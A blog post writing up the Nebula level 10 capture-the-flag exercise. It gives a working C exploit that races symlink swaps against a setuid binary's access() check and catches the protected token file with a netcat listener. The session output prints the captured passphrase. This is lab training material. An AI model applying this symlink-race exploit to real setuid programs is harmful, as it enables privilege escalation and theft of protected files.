---
layout: post
title: "Race condition"
category: CTF, Nebula
---

>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; **[Nebula 10](http://exploit-exercises.com/nebula/level09) Agenda**: "The setuid binary at "_/home/flag10/flag10_" will upload any file given, as long as it meets the requirements of the "_access()_" system call"

<center>
	<img src="/images/2015-04-25-race_condition/czLY2.jpg">
</center>
We have a classic [TOCTOU](http://en.wikipedia.org/wiki/Time_of_check_to_time_of_use) issue. There's no need for more explanation, because all things are perfectly fleshed out on the wikipedia. I wrote some anchor point which in order is playing with symlinks replacement until succeed:

{% highlight c linenos %}
/** PWN_10.c **/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>

#define BANNER ".oO Oo."
#define MOCKUP "some text"
#define LISTENER "nc -lk 18211"

const int BUFF_SIZE = 64;
static int *is_found = 0;

int check_success(char *banner, char *data) 
{
    return (strstr(banner, BANNER) != NULL)
        && (strstr(data, MOCKUP)   == NULL);
}

void setup_listener() 
{
    char prev_line[BUFF_SIZE];
    char curr_line[BUFF_SIZE];

    FILE *fd = popen(LISTENER, "r");

    while (fgets(curr_line, BUFF_SIZE, fd) != NULL) 
    {
        if (check_success(prev_line, curr_line)) 
        {
            *is_found = 1;
            printf("\n\nThe passprase is: %s\n\n", curr_line);
            pclose(fd);
        }
        strcpy(prev_line, curr_line);
    }
}

void start_race()
{
    while (*is_found == 0) 
    {
        system("ln -sfn /tmp/dummy /tmp/lure");
        sleep(1);
        system("/home/flag10/flag10 /tmp/lure 127.0.0.1 & ln -sfn /home/flag10/token /tmp/lure");
    }
}

int main(int argc, char *argv[]) 
{
    is_found = mmap(NULL, sizeof *is_found, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    pid_t childPID = fork();

    if (childPID == 0) {
        setup_listener();
    } else {
        start_race();
    }

    exit(EXIT_SUCCESS);
}
{% endhighlight %}
Compile, prepare "_/tmp/dummy_", execute and "_Veni Vidi Vici_".
{% highlight sh linenos %}
level10@nebula:~$ gcc -o pwn PWN_10.c
level10@nebula:~$ echo "some text" > /tmp/dummy
level10@nebula:~$ ./pwn
You don't have access to /tmp/lure
Connecting to 127.0.0.1:18211 .. Connected!
Sending file ..

The passprase is: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27

wrote file!
Connecting to 127.0.0.1:18211 .. level10@nebula:~$ Connected!
Sending file .. wrote file!
{% endhighlight %}